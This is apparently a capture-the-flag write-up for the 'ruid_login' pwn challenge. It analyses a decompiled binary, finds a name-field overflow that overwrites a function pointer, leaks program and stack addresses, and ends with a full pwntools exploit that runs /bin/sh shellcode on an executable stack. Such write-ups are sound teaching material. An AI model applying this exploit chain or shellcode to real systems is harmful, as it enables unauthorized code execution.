## Challenge Overview
**Category**: Pwn

---

## Analysis
- This challenge provide ELF 64-bit file.
![alt text](/images/ctf/Scarlet_CTF_2026/ruid_login_file.png)

- Use `checksec` to verify that the binary has an executable stack.
![alt text](/images/ctf/Scarlet_CTF_2026/ruid_login_checksec.png)

- I use IDA to disassemble binary.
- `main` function:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-60h]
  int i; // [rsp+4h] [rbp-5Ch]
  __int64 RUID; // [rsp+8h] [rbp-58h] BYREF
  _QWORD buf[10]; // [rsp+10h] [rbp-50h] BYREF

  buf[9] = __readfsqword(0x28u);
  setbuf(_bss_start, 0);
  setbuf(stdin, 0);
  setup_users();
  puts("Welcome to Rutgers University!");
  printf("Please enter your netID: ");
  memset(buf, 0, 64);
  read(0, buf, 0x40u);
  *((_BYTE *)buf + strcspn((const char *)buf, "\n")) = 0;
  printf("Accessing secure interface as netid '%s'\n", (const char *)buf);
  while ( !feof(stdin) )
  {
    list_ruids();
    printf("Please enter your RUID: ");
    __isoc23_scanf("%lu%*c", &RUID);
    printf("Logging in as RUID %lu..\n", RUID);
    v4 = 0;
    for ( i = 0; i <= 1; ++i )
    {
      if ( rand_num[6 * i] == RUID )
      {
        putchar(10);
        printf("Welcome, %s!\n", (const char *)&users + 48 * i);
        (*((void (**)(void))&func_addr + 6 * i))();
        putchar(10);
        v4 = 1;
      }
    }
    if ( !v4 )
      puts("No match!");
  }
  return 0;
}
```

- `setup_users` function to setup value for variable global. users, rand_num, func_addr respectively contain the name, random number and addresses of the prof and dean functions. But ater each debug session, I noticed the random number seemed to remain unchanged.

```c
  src[0] = "Professor";
  src[1] = "Dean";
  v3[0] = prof;
  v3[1] = dean;
  for ( i = 0; i <= 1; ++i )
  {
    strcpy((char *)&users + 48 * i, src[i]);
    rand_num[6 * i] = rand();
    *((_QWORD *)&func_addr + 6 * i) = v3[i];
  }
```

- All three variables access two elements 0 and 6. The storage space allocated for these variables:
```c
.bss:00000000000040E0 users           dq ?                                                    
.bss:00000000000040E8                 dq ?
.bss:00000000000040F0                 dq ?
.bss:00000000000040F8                 dq ?
.bss:0000000000004100 func_addr       dq ?                             
.bss:0000000000004108 rand_num        dq 7 dup(?) 
```

- `prof` function prints student information including name, NetID, and GPA. This information is declared globally, allowing GPA modification; however, this function does not have vulnerabilities.
```c
  puts("Change a student's GPA!");
  puts("Students:");
  for ( i = 0; i <= 5; ++i )
    printf(
      "[%d] %s (NetID %s) %.1f\n",
      i,
      (const char *)*(&students + 3 * (int)i),
      (&off_4028)[3 * (int)i],
      *((double *)&unk_4030 + 3 * (int)i));
  if ( (unsigned int)get_number(&v1, 6) )
  {
    for ( j = 100.0; j > 4.0 || j <= 0.0; __isoc23_scanf("%lf%*c", &j) )
      printf("GPA: ");
    *((double *)&unk_4030 + 3 * v1) = j;
    printf("GPA of %s now changed to %.1f!\n", (const char *)*(&students + 3 * v1), *((double *)&unk_4030 + 3 * v1));
  }
```

- `dean` function allow change name. However, reading up to 41 characters with the variable space provided above, it's entirely possible to overwrite `func_addr` and `rand_num`.
```c
  puts("Change a staff member's name!");
  list_ruids();
  if ( (unsigned int)get_number(&v1, 2) )
  {
    printf("New name: ");
    read(0, &users[6 * v1], 41u); // Buffer overflow
  }
```

- In `main` function, `buf` var is declared on the stack with 80 bytes, and only 64 bytes are read, so there is no error. But shellcode can be passed to execute by a file that allows execution on the stack.  
```c
  _QWORD buf[10]; 
   read(0, buf, 64u);
  *((_BYTE *)buf + strcspn((const char *)buf, "\n")) = 0;
```

- Afterward, the program prompts for the input of the RUID and compares it with the value stored in rand_num, prints the name and calls the corresponding function address stored in `func_addr`.
```c
printf("Please enter your RUID: ");
__isoc23_scanf("%lu%*c", &RUID);
printf("Logging in as RUID %lu..\n", RUID);
v4 = 0;
for ( i = 0; i <= 1; ++i )
{
    if ( rand_num[6 * i] == RUID )
    {
    putchar(10);
    printf("Welcome, %s!\n", (const char *)&users[6 * i]);
    ((void (*)(void))func_addr[6 * i])();
    putchar(10);
    v4 = 1;
    }
}
```

- As mentioned, the `dean` function allows writing 41 bytes to `users`, so it can overwrite `func_addr` to call the desired address.
- Binary has PIE enabled, so I can use buffer overflow to leak the actual address of the `prof` or `dean` function using printf.
```c
printf("[%d] {RUID REDACTED} %s\n", i, (const char *)&users[6 * i]); // In list_ruids func
printf("Welcome, %s!\n", (const char *)&users[6 * i]); // In main func
```

- Now I need to leak a stack address in order to point to the `buf` variable on the stack, where the shellcode is stored.
- I found that before calling `call rax`, the `rdi` register is pointing to an address on the stack that `rax` can fix by exploiting the buffer overflow vulnerability above. Instead of calling the `prof` func, I will call the `puts` func, thereby leaking the stack address.
![alt text](/images/ctf/Scarlet_CTF_2026/ruid_login_callrax.png)
![alt text](/images/ctf/Scarlet_CTF_2026/ruid_login_plt.png)

---

## Exploit code
```python
from pwn import *

p = process('./ruid_login')
# p = remote()

# Input shellcode (\bin\sh) to buf
shellcode = asm('''
    mov rdi, 29400045130965551
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
''', arch='amd64')
input()
p.sendafter(b'your netID: ', shellcode)

# Leak address prof func
p.sendlineafter(b'RUID: ', b'846930886')
p.sendlineafter(b'Num: ', b'0')
payload = b'a' * 32
p.sendafter(b'New name: ', payload)
tmp = p.recvline()
tmp = p.recvline()
tmp = p.recvline()[52:-1]
prof_addr = u64(tmp.ljust(8, b'\x00'))
print(hex(prof_addr))

# Modify rax = puts_plt
puts_plt = prof_addr - 675
p.sendlineafter(b'RUID: ', b'846930886')
p.sendlineafter(b'Num: ', b'0')
payload = b'a' * 32 + p64(puts_plt)
p.sendafter(b'New name: ', payload)

# Leak stack address
p.sendlineafter(b'RUID: ', b'1804289383')
p.recvuntil(b'!\n')
tmp = p.recvline()[:6]
print(tmp)
stack_leak = u64(tmp.ljust(8, b'\x00'))
print(hex(stack_leak))

# Modify rax = buf_addr
buf_addr = stack_leak + 448
p.sendlineafter(b'RUID: ', b'846930886')
p.sendlineafter(b'Num: ', b'0')
payload = b'a' * 32 + p64(buf_addr)
p.sendafter(b'New name: ', payload)

# Call shellcode on buf
p.sendlineafter(b'RUID: ', b'1804289383')

p.interactive()
```
